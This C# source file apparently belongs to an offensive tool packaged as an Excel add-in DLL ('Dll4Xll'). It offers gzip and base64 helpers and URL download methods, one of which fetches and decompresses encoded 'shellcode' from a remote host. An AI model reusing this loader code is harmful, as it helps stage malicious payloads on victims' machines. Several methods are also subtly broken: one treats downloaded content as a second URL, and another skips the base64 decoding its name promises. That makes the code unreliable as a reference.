using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;

namespace Dll4Xll
{
    public class SkavenCode
    {
        public static void CompressAndEncodeFile(string inputFile, string outputFile)
        {
            byte[] inputBytes;
            using (var inputStream = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
            {
                inputBytes = new byte[inputStream.Length];
                inputStream.Read(inputBytes, 0, (int)inputStream.Length);
            }
            // Compress the input bytes
            byte[] compressedBytes = CompressData(inputBytes);
            // Encode the compressed bytes in base64
            string encodedString = Convert.ToBase64String(compressedBytes);
            // Write the encoded string to the output file
            using (var outputStream = new StreamWriter(outputFile))
            {
                outputStream.Write(encodedString);
            }
        }
        
        public static string CompressAndEncodeData(string inputData)
        {
            byte[] inputBytes = Encoding.UTF8.GetBytes(inputData);
            // Compress the input bytes
            byte[] compressedBytes = CompressData(inputBytes);
            // Encode the compressed bytes in base64
            string encodedString = Convert.ToBase64String(compressedBytes);
            return encodedString;
        }

        public static string CompressAndEncodeUrl(string url)
        {
            byte[] inputBytes;
            using (var client = new WebClient())
            {
                inputBytes = client.DownloadData(url);
            }      
            // Compress the input bytes
            byte[] compressedBytes = CompressData(inputBytes);
            // Encode the compressed bytes in base64
            string encodedString = Convert.ToBase64String(compressedBytes);
            return encodedString;
        }



        public static void DecodeAndDecompress(string inputFile, string outputFile)
        {
            using (FileStream inputStream = new FileStream(inputFile, FileMode.Open))
            using (FileStream outputStream = new FileStream(outputFile, FileMode.Create))
            using (GZipStream decompressionStream = new GZipStream(inputStream, CompressionMode.Decompress))
            {
                byte[] buffer = new byte[1024 * 4];
                int read;
                while ((read = decompressionStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    outputStream.Write(buffer, 0, read);
                }
            }
        }

        public static byte[] DecodeAndDecompressData(string encodedData)
        {
            byte[] compressedData = Convert.FromBase64String(encodedData);
            byte[] decompressedData = DecompressData(compressedData);
            return decompressedData;
        }

        public static byte[] DecodeAndDecompressUrl(string url)
        {
            byte[] shellcode;
            using (WebClient client = new WebClient())
            {
                string encodedShellcode = client.DownloadString(url);
                byte[] decodedBytes = SkavenCode.DecodeFromBase64Url(encodedShellcode);
                using (MemoryStream inputStream = new MemoryStream(decodedBytes))
                using (MemoryStream outputStream = new MemoryStream())
                using (GZipStream decompressionStream = new GZipStream(inputStream, CompressionMode.Decompress))
                {
                    byte[] buffer = new byte[1024 * 4];
                    int read;
                    while ((read = decompressionStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        outputStream.Write(buffer, 0, read);
                    }
                    shellcode = outputStream.ToArray();
                }
            }
            return shellcode;
        }

        // Changes here to return value, storing as input bytes and returning
        public static byte[] CompressData(byte[] inputBytes)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                using (GZipStream compressionStream = new GZipStream(ms, CompressionMode.Compress))
                {
                    compressionStream.Write(inputBytes, 0, inputBytes.Length);
                }
                inputBytes = ms.ToArray();
            }
            return inputBytes;
        }

        public static void CompressFile(string inputFile, string outputFile)
        {
            byte[] inputBytes = File.ReadAllBytes(inputFile);
            byte[] compressedBytes = CompressData(inputBytes);
            File.WriteAllBytes(outputFile, compressedBytes);
        }

        public static byte[] CompressFromUrl(string url, string outputFile = null)
        {
            byte[] compressedData;
            using (WebClient client = new WebClient())
            {
                compressedData = client.DownloadData(url);
            }

            using (MemoryStream ms = new MemoryStream())
            {
                using (GZipStream compressionStream = new GZipStream(ms, CompressionMode.Compress))
                {
                    compressionStream.Write(compressedData, 0, compressedData.Length);
                }
                compressedData = ms.ToArray();
            }

            if (outputFile != null)
            {
                File.WriteAllBytes(outputFile, compressedData);
                return null;
            }
            else
            {
                return compressedData;
            }
        }




        public static byte[] DecompressData(byte[] inputBytes)            
        {
            byte[] decompressedData;
            using (MemoryStream ms = new MemoryStream(inputBytes))
            {
                using (GZipStream decompressionStream = new GZipStream(ms, CompressionMode.Decompress))
                {
                    using (MemoryStream outputStream = new MemoryStream())
                    {
                        decompressionStream.CopyTo(outputStream);
                        decompressedData = outputStream.ToArray();
                    }
                }
            }
            return decompressedData;
        }

        public static void DecompressFile(string inputFile, string outputFile)
        {
            byte[] inputBytes = File.ReadAllBytes(inputFile);
            byte[] decompressedBytes = DecompressData(inputBytes);
            File.WriteAllBytes(outputFile, decompressedBytes);
        }

        public static byte[] DecompressFromUrl(string url, string outputFile = null)
        {
            byte[] decompressedData;
            using (WebClient client = new WebClient())
            {
                byte[] inputBytes = client.DownloadData(url);
                using (MemoryStream ms = new MemoryStream(inputBytes))
                {
                    using (GZipStream decompressionStream = new GZipStream(ms, CompressionMode.Decompress))
                    {
                        using (MemoryStream outputStream = new MemoryStream())
                        {
                            decompressionStream.CopyTo(outputStream);
                            decompressedData = outputStream.ToArray();
                        }
                    }
                }
            }

            if (outputFile != null)
            {
                File.WriteAllBytes(outputFile, decompressedData);
                return null;
            }
            else
            {
                return decompressedData;
            }
        }

        // Should make these "EncodeToBase64File" to differentiate from Url
        public static void EncodeToBase64File(string inputFile, string outputFile)
        {
            byte[] inputBytes = File.ReadAllBytes(inputFile);
            string encodedData = Convert.ToBase64String(inputBytes);
            File.WriteAllText(outputFile, encodedData);
        }
        public static void EncodeToBase64Data(byte[] compressedData, string outputFile)
        {
            string encodedData = Convert.ToBase64String(compressedData);
            File.WriteAllText(outputFile, encodedData);
        }

        public static string EncodeToBase64Url(string url)
        {
            using (WebClient client = new WebClient())
            {
                string String = client.DownloadString(url);
                byte[] inputBytes = Encoding.UTF8.GetBytes(String);
                string encodedData = Convert.ToBase64String(inputBytes);
                return encodedData;
            }
        }

        public static byte[] DecodeFromBase64Data(string inputFile)
        {
            string encodedData = File.ReadAllText(inputFile);
            byte[] decodedData = Convert.FromBase64String(encodedData);
            return decodedData;
        }

        public static void DecodeFromBase64File(string inputFile, string outputFile)
        {
            string base64String = File.ReadAllText(inputFile);
            byte[] decodedBytes = Convert.FromBase64String(base64String);
            File.WriteAllBytes(outputFile, decodedBytes);
        }

        public static byte[] DecodeFromBase64Url(string url)
        {
            using (WebClient client = new WebClient())
            {
                string base64String = client.DownloadString(url);
                byte[] inputBytes = Convert.FromBase64String(base64String);
                return inputBytes;
            }
        }

    }
}


